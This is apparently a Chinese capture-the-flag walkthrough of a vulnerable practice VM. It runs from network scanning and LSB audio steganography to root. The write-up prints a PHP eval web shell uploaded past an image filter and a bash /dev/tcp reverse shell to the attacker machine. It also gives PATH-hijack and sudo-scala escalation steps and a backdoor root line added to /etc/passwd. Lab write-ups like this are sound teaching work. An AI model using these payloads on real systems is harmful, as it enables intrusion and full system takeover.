![image-20250717204541576](https://7r1UMPHK.github.io/image/20250717204550270.webp)

下载地址：https://mega.nz/file/If9khB4Y#osVSL5SXMQSUQEicWYFZ3Q5w-lovLyamBD_kfDpuNVI

---

# 一、信息收集与服务探测

## 1. 主机发现

首先，在内网环境中，我们使用 `arp-scan` 来发现同一网段下的存活主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.192 08:00:27:d7:eb:a4       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.

4 responded
```

扫描结果显示，目标靶机的 IP 地址为 `192.168.205.192`。

## 2. 端口与服务扫描

确定目标 IP 后，使用 `nmap` 对其进行全端口扫描，以发现所有开放的 TCP 端口及其上运行的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.192
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 08:48 EDT
Nmap scan report for 192.168.205.192
Host is up (0.00019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:D7:EB:A4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```

结果显示目标开放了两个常见端口：

*   **22/tcp**: SSH 服务，用于远程登录。
*   **80/tcp**: HTTP 服务，即标准 Web 服务。

# 二、Web 探索与漏洞发现

## 1. 域名与子域名发现

访问 `http://192.168.205.192` 是一个电商网站。尝试注册一个账号并登录后，在 “我的订单” 页面发现了一个 PHP 报错信息。

![image-20250717205207123](https://7r1UMPHK.github.io/image/20250717205207346.webp)

> **Warning**: Undefined array key "role" in **/var/www/chabaidao.dsz/customer/includes/header.php** on line **35**

这个报错泄露了网站的根目录路径，并揭示了其域名为 `chabaidao.dsz`。我们将此域名添加到本地 `hosts` 文件中。

```bash
# 在 /etc/hosts 文件中添加
192.168.205.192 chabaidao.dsz
```

接着，使用 `wfuzz` 对该域名进行子域名爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wfuzz -c -u "http://chabaidao.dsz/" -H "HOST:FUZZ.chabaidao.dsz" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 764

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000002:   200        610 L    1372 W     21027 Ch    "mail - mail"
...
```

发现一个子域名 `mail.chabaidao.dsz`，同样将其添加到 `hosts` 文件。

```bash
# 更新 /etc/hosts 文件
192.168.205.192 chabaidao.dsz mail.chabaidao.dsz
```

## 2. 隐写术分析

访问 `http://mail.chabaidao.dsz/`，页面上只有一个可以播放音乐文件 `music.wav`。

![image-20250717205551792](https://7r1UMPHK.github.io/image/20250717205552105.webp)

通过查看源代码下载 `music.wav` 文件，并且与网络上的原曲（刘瑞琦-两三句）进行二进制比较 (`cmp -l`)，发现两个文件在许多字节上仅相差 1。这强烈指向了 **最低有效位（LSB）隐写**。

> **什么是 LSB 隐写？**
>
> LSB（Least Significant Bit）隐写是一种将秘密信息嵌入到数字媒体（如图像或音频）中的技术。它通过修改每个样本（或像素）数据中“最不重要”的比特（即最低位）来隐藏信息。由于这种修改对原始文件的影响极小，人耳或肉眼很难察夜。

我们编写一个 Python 脚本来提取 `music.wav` 数据部分所有字节的最低有效位，并将它们重新组合成一个文件。

```python
import sys

def ext(fin, fout):
    try:
        with open(fin, 'rb') as f:
            data = f.read()
        
        bits = [str(b & 1) for b in data[44:]]
        
        b_arr = bytearray()
        for i in range(0, len(bits) - len(bits) % 8, 8):
            b_arr.append(int("".join(bits[i:i+8]), 2))
            
        with open(fout, 'wb') as f:
            f.write(b_arr)
            
        print(f"提取完成 -> {fout}")

    except Exception as e:
        print(f"错误: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("用法: python3 extract.py <输入wav> <输出文件>")
        sys.exit(1)
    
    ext(sys.argv[1], sys.argv[2])
                                  
```

执行脚本后，我们得到了一个名为 `a` 的文件。使用 `strings` 命令查看这个文件的内容，在开头部分发现了一组凭据。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 lsb.py music.wav a
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ strings a |head -n 10 
admin@liverpool12
z       K>p
aLPu
pQV=i
$1]4
UDPs
$$@D
n>h'2
gu]@
TeHE$Zd
```

我们成功找到了隐藏的密码：`admin@liverpool12`。

# 三、初始访问

## 1. 后台登录与文件上传

使用 `admin@`chabaidao.dsz 邮箱和刚找到的密码 `admin@liverpool12` 成功登录了主站 `http://chabaidao.dsz/` 的后台。

![image-20250717225850690](https://7r1UMPHK.github.io/image/20250717225851014.webp)

后台个人资料页面有一个头像上传功能，提示只允许上传图片格式。这是一个典型的突破口。我们采用以下步骤绕过限制：

1.  准备一个蚁剑的ant.php文件，将其改名为ant.png进行上传(php反弹shell无法有效执行)

> ```
> ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
> └─$ cat ant.png
> <?php eval($_POST['ant']); ?>
> ```

1.  使用 Burp Suite 拦截文件上传的请求。
2.  将请求中的文件名从 `ant.png` 修改为 `ant.php`。
3.  发送修改后的请求，即可成功上传 `any.php`。
4.  上传成功，查看头像源码获得url。

5.  使用蚁剑进行连接。

![image-20250717230617743](https://7r1UMPHK.github.io/image/20250717230617972.webp)

## 2. 反弹 Shell

在攻击机（Kali）上监听端口：

```bash
nc -lvnp 8888
```

在蚁剑的虚拟终端弹shell回去kali，方便操作。

攻击机成功接收到连接，获得了 `www-data` 用户的 Shell。为方便后续操作，升级为功能齐全的 TTY。

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

# 四、权限提升

## 1. 提权至 welcome (PATH 劫持)

获得了 `www-data` 的 Shell 后，首先检查 `sudo` 权限。

```bash
www-data@Chabaidao:/tmp$ sudo -l
...
User www-data may run the following commands on Chabaidao:
    (welcome) NOPASSWD: /home/welcome/write
www-data@Chabaidao:/tmp$ cat /home/welcome/write 
#!/bin/bash

# 检查参数数量
if [ $# -lt 2 ]; then
    echo "用法: $0 <文件路径> <要写入的内容>"
    exit 1
fi

file_path="$1"
content="$2"

# 检查文件是否存在
if [ ! -f "$file_path" ]; then
    echo "错误：文件 '$file_path' 不存在，无法写入。"
    exit 2
fi

# 写入内容
echo "$content" > "$file_path"
echo "内容已成功写入到 $file_path"
```

`www-data` 用户可以免密以 `welcome` 用户的身份执行 `/home/welcome/write` 脚本。可以看出wirte脚本是以welcome用户实现写入的一个脚本，并且通过进程监控发现 `welcome` 用户会定时执行 `/home/welcome/chabaidao` 脚本，该脚本会读取 `/home/welcome/myfile` 的内容作为 `PATH` 环境变量。这是典型的 **PATH 环境变量劫持** 提权路径。

1. 在 `www-data` 用户可写的目录（如 `/dev/shm`）下创建一个名为 `file` 的恶意脚本，内容为反弹 Shell 命令，并赋予执行权限。

   ```bash
   www-data@Chabaidao:/tmp$ cd /dev/shm/  
   www-data@Chabaidao:/dev/shm$ cat > file << 'EOL'
   > #!/bin/bash
   > bash -c "/bin/bash -i >& /dev/tcp/192.168.205.128/8888 0>&1"
   > EOL
   www-data@Chabaidao:/dev/shm$ chmod +x file
   ```

2. 利用 `www-data` 的 `sudo` 权限，以 `welcome` 身份执行 `write` 脚本，将我们的恶意脚本所在目录 `/dev/shm` 添加到 `/home/welcome/myfile` 定义的 `PATH` 变量的最前面。

   ```bash
   www-data@Chabaidao:/dev/shm$ echo "/dev/shm/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games" > /tmp/a
   www-data@Chabaidao:/dev/shm$ sudo -u welcome /home/welcome/write /home/welcome/myfile "$(cat /tmp/a)"
   ```

3. 在攻击机上监听 8888 端口，等待定时任务执行。当 `chabaidao` 脚本执行时，它会使用我们篡改后的 `PATH`，从而优先执行了 `/dev/shm/file`，我们就获得了 `welcome` 用户的 Shell。

## 2. 提权至 root (Scala Sudo 提权)

拿到 `welcome` 用户的 Shell 后，再次检查 `sudo` 权限。

```bash
welcome@Chabaidao:~$ sudo -l
...
User welcome may run the following commands on Chabaidao:
    (ALL) NOPASSWD: /usr/bin/scala
```

`welcome` 用户可以免密以 `root` 权限执行 `scala`。我们可以利用 `scala` 的交互式解释器来执行任意系统命令。

1. 以 `root` 权限启动 `scala` 解释器。

   ```bash
   sudo /usr/bin/scala
   ```

2. 在 `scala` 解释器中，使用 `:sh` 命令执行一个 shell 命令，为 `/bin/bash` 添加 SUID 权限位。

   ```scala
   Welcome to Scala 2.11.12 ...
   Type in expressions for evaluation. Or try :help.
   
   scala> :sh chmod +s /bin/bash
   res0: scala.tools.nsc.interpreter.ProcessResult = `chmod +s /bin/bash` (0 lines, exit 0)
   
   scala> :quit
   ```

3. 退出 `scala` 后，执行 `bash -p` 来利用 SUID 位，获得一个 `euid=0` 的 root 权限 Shell。

   ```bash
   welcome@Chabaidao:~$ bash -p
   bash-5.0# id
   uid=1000(welcome) gid=1000(welcome) euid=0(root) egid=0(root) groups=0(root),1000(welcome)
   bash-5.0# whoami
   root
   bash-5.0#echo 'b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash' >> /etc/passwd
   bash-5.0#su b
   Password: abcdefg
   root@Chabaidao:~# id
   uid=0(root) gid=0(root) groups=0(root)
   root@Chabaidao:~# cat /home/welcome/user.txt /root/root.txt 
   flag{user-12fc204edeae5b57713c5ad7dcb97d39}
   flag{root-12fc204edeae5b57713c5ad7dcb97d39}
   ```

成功提权至 root，渗透测试完成。